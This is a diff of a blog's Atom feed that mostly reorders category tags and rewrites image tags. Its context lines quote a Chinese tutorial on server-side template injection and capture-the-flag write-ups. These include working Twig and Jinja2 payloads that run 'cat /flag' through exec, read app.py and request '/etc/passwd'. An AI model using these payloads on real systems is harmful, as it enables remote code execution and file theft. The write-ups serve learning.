@@ -6,15 +6,15 @@
     <updated>2021-11-23T11:57:15.038Z</updated>
     <category term="随笔" />
     <category term="debug" />
-    <category term="文件包含" />
-    <category term="http" />
     <category term="业余爱好" />
+    <category term="文件包含" />
     <category term="反序列化" />
-    <category term="命令执行" />
+    <category term="http" />
     <category term="代码审计" />
-    <category term="SSRF" />
-    <category term="RCE" />
     <category term="sql" />
+    <category term="命令执行" />
+    <category term="RCE" />
+    <category term="SSRF" />
     <category term="SSTI" />
     <category term="upload" />
     <category term="php" />
@@ -64,7 +64,7 @@ from /usr/lib/ruby/2.5.0/erb.rb:876:in `result&#39;
 from -e:4:in `&amp;lt;main&amp;gt;&#39;
 &lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;否则，需要手动测试特定于语言的不同有效负载，根据不同的运算值判断模板。常用的方法是使用来自不同模板引擎的语法注入任意数学运算。&lt;/p&gt;
-&lt;p&gt;&amp;lt;img src=&amp;quot;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9waWM0LnpoaW1nLmNvbS84MC92Mi0zMzIxZjQ2ODU5YzBiZTllOTNmOWFkNzlmM2RkMWNkM18xNDQwdy5qcGc=&#34;&gt;https://pic4.zhimg.com/80/v2-3321f46859c0be9e93f9ad79f3dd1cd3_1440w.jpg&lt;/span&gt;&amp;quot;alt=&amp;quot; 决策树 &amp;quot;style=&amp;quot;zoom: 67%;&amp;quot; /&amp;gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://pic4.zhimg.com/80/v2-3321f46859c0be9e93f9ad79f3dd1cd3_1440w.jpg&#34; alt&gt;&lt;/p&gt;
 &lt;p&gt;这里的绿线表示结果成功返回，红线反之。&lt;/p&gt;
 &lt;p&gt;相同的有效负载有时可能会以一种以上的模板语言返回成功的响应。例如有效负载 &lt;code&gt;&amp;#123; &amp;#123;7*&#39;7&#39;&amp;#125; &amp;#125;&lt;/code&gt;  在 Twig 中返回&lt;strong&gt; 49&lt;/strong&gt;，在 Jinja2 中返回&lt;strong&gt; 7777777&lt;/strong&gt;。&lt;/p&gt;
 &lt;h2 id=&#34;漏洞利用&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#漏洞利用&#34;&gt;#&lt;/a&gt; 漏洞利用&lt;/h2&gt;
@@ -93,7 +93,7 @@ $&amp;#123;x&amp;#125;
 &lt;p&gt;但是越来越多的模板会提供安全措施（比方说沙箱，过滤）来保证安全性，因此开发模板注入后门越来越难了。&lt;/p&gt;
 &lt;h2 id=&#34;常见模板&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#常见模板&#34;&gt;#&lt;/a&gt; 常见模板&lt;/h2&gt;
 &lt;p&gt;下图为&lt;strong&gt;常见模板结构&lt;/strong&gt;：&lt;/p&gt;
-&lt;p&gt;&amp;lt;img src=&amp;quot;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9pbWctYmxvZy5jc2RuaW1nLmNuLzIwMjAwODAzMTA0NjU3MjM3LnBuZw==&#34;&gt;https://img-blog.csdnimg.cn/20200803104657237.png&lt;/span&gt;&amp;quot; style=&amp;quot;zoom: 50%;&amp;quot; /&amp;gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://img-blog.csdnimg.cn/20200803104657237.png&#34; alt&gt;&lt;/p&gt;
 &lt;h3 id=&#34;1jinja2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#1jinja2&#34;&gt;#&lt;/a&gt; 1.jinja2&lt;/h3&gt;
 &lt;h4 id=&#34;常用函数&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#常用函数&#34;&gt;#&lt;/a&gt; &lt;strong&gt;常用函数&lt;/strong&gt;&lt;/h4&gt;
 &lt;pre&gt;&lt;code&gt;__dict__            保存类实例或对象实例的属性变量键值对字典
@@ -255,7 +255,7 @@ POST /subscribe?0=cat+/etc/passwd HTTP/1.1
 &lt;p&gt;&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;h1 id=&#34;一-护网杯-2018easy_tornado&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#一-护网杯-2018easy_tornado&#34;&gt;#&lt;/a&gt; 一、[护网杯 2018] easy_tornado&lt;/h1&gt;
 &lt;p&gt;打开题目，只有三个链接，如图，&lt;/p&gt;
-&lt;p&gt;&amp;lt;img src=&amp;quot;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDYvMjgvSnBTcm5xY3U5UXpnUmsxLnBuZw==&#34;&gt;https://i.loli.net/2021/06/28/JpSrnqcu9QzgRk1.png&lt;/span&gt;&amp;quot; alt=&amp;quot;1.1.png&amp;quot; style=&amp;quot;zoom: 33%;&amp;quot; /&amp;gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/06/28/JpSrnqcu9QzgRk1.png&#34; alt&gt;&lt;/p&gt;
 &lt;p&gt;依次点开&lt;/p&gt;
 &lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/06/28/GUD9pRAlmoFywSE.png&#34; alt=&#34;1.2.png&#34;&gt;&lt;/p&gt;
 &lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/06/28/7girIkdaASC4O1x.png&#34; alt=&#34;1.3.png&#34;&gt;&lt;/p&gt;
@@ -293,18 +293,18 @@ POST /subscribe?0=cat+/etc/passwd HTTP/1.1
 &lt;h1 id=&#34;二-bjdctf2020cookie-is-so-stable&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#二-bjdctf2020cookie-is-so-stable&#34;&gt;#&lt;/a&gt; 二、[BJDCTF2020] Cookie is so stable&lt;/h1&gt;
 &lt;p&gt;打开题目，需要输入 id，随便输入后发现找不到 flag&lt;/p&gt;
 &lt;p&gt;尝试注入&lt;/p&gt;
-&lt;p&gt;&amp;lt;img src=&amp;quot;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDYvMjgvZDR1ZWd0bm9aMjNNaXhzLnBuZw==&#34;&gt;https://i.loli.net/2021/06/28/d4uegtnoZ23Mixs.png&lt;/span&gt;&amp;quot; alt=&amp;quot;2.1.png&amp;quot; style=&amp;quot;zoom:50%;&amp;quot; /&amp;gt;&lt;/p&gt;
-&lt;p&gt;&amp;lt;img src=&amp;quot;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDYvMjgvUFFoNFhsYlNLSE5FUk9JLnBuZw==&#34;&gt;https://i.loli.net/2021/06/28/PQh4XlbSKHNEROI.png&lt;/span&gt;&amp;quot; alt=&amp;quot;2.2.png&amp;quot; style=&amp;quot;zoom:50%;&amp;quot; /&amp;gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/06/28/d4uegtnoZ23Mixs.png&#34; alt&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/06/28/PQh4XlbSKHNEROI.png&#34; alt&gt;&lt;/p&gt;
 &lt;p&gt;发现有明显的注入漏洞，又因为结构为 49 且基于 php，可以推测出模板为 twig。根据源码提示进行抓包，发现 uesr 是注入点&lt;/p&gt;
-&lt;p&gt;&amp;lt;img src=&amp;quot;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDYvMjgvZkhMb1dpQjhVMXNiWWszLnBuZw==&#34;&gt;https://i.loli.net/2021/06/28/fHLoWiB8U1sbYk3.png&lt;/span&gt;&amp;quot; alt=&amp;quot;2.3.png&amp;quot; style=&amp;quot;zoom:50%;&amp;quot; /&amp;gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/06/28/fHLoWiB8U1sbYk3.png&#34; alt&gt;&lt;/p&gt;
 &lt;p&gt;直接百度或根据上一篇文章的 payload 进行注入&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;&amp;#123;&amp;#123;_self.env.registerUndefinedFilterCallback(&#34;exec&#34;)&amp;#125;&amp;#125;&amp;#123;&amp;#123;_self.env.getFilter(&#34;cat /flag&#34;)&amp;#125;&amp;#125;
 &lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&amp;lt;img src=&amp;quot;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDYvMjgvU2ptaEZheG5Jd0RlUmZRLnBuZw==&#34;&gt;https://i.loli.net/2021/06/28/SjmhFaxnIwDeRfQ.png&lt;/span&gt;&amp;quot; alt=&amp;quot;2.4.png&amp;quot; style=&amp;quot;zoom:50%;&amp;quot; /&amp;gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/06/28/SjmhFaxnIwDeRfQ.png&#34; alt&gt;&lt;/p&gt;
 &lt;p d7ef7d9d-6ba4-4dd5-88ec-33500d9b2ad3&gt;得 flag&lt;/p&gt;
 &lt;h1 id=&#34;三-gyctf2020flaskapp&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#三-gyctf2020flaskapp&#34;&gt;#&lt;/a&gt; 三、[GYCTF2020] FlaskApp&lt;/h1&gt;
 &lt;p&gt;进去是这个页面，提示里没有信息&lt;/p&gt;
-&lt;p&gt;&amp;lt;img src=&amp;quot;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDYvMjgvVUhrQWR3czVaclhmZ1FiLnBuZw==&#34;&gt;https://i.loli.net/2021/06/28/UHkAdws5ZrXfgQb.png&lt;/span&gt;&amp;quot; alt=&amp;quot;3.1.png&amp;quot; style=&amp;quot;zoom:50%;&amp;quot; /&amp;gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/06/28/UHkAdws5ZrXfgQb.png&#34; alt&gt;&lt;/p&gt;
 &lt;p&gt;随便尝试后，发现加密中可以注入代码，解密就能得到值：&lt;/p&gt;
 &lt;p&gt;注入 14 得 e3s3Kzd9fQ== 翻译得 14&lt;/p&gt;
 &lt;p&gt;但再注入 49 时，加密得 e3s3Kjd9fQ==&lt;/p&gt;
@@ -316,7 +316,7 @@ POST /subscribe?0=cat+/etc/passwd HTTP/1.1
 &lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/06/28/y8W4mGaiohPDg3J.png&#34; alt=&#34;3.3.png&#34;&gt;&lt;/p&gt;
 &lt;p&gt;发现又被过滤了，于是考虑查看源码，在解密中随便输入进入 debug：&lt;/p&gt;
-&lt;p&gt;&amp;lt;img src=&amp;quot;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDYvMjgvYUVwWTVQU0RNbEtUd0hmLnBuZw==&#34;&gt;https://i.loli.net/2021/06/28/aEpY5PSDMlKTwHf.png&lt;/span&gt;&amp;quot; alt=&amp;quot;3.4.png&amp;quot; style=&amp;quot;zoom:50%;&amp;quot; /&amp;gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://i.loli.net/2021/06/28/aEpY5PSDMlKTwHf.png&#34; alt&gt;&lt;/p&gt;
 &lt;p&gt;可以发现，在输出结果时有过滤，存在于 app.py 的 waf 中，百度一下 payload，尝试读取文件&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;&amp;#123;% for c in [].__class__.__base__.__subclasses__() %&amp;#125;&amp;#123;% if c.__name__==&#39;catch_warnings&#39; %&amp;#125;&amp;#123;&amp;#123; c.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;app.py&#39;, &#39;r&#39;).read() &amp;#125;&amp;#125;&amp;#123;% endif %&amp;#125;&amp;#123;% endfor %&amp;#125;
 &lt;/code&gt;&lt;/pre&gt;
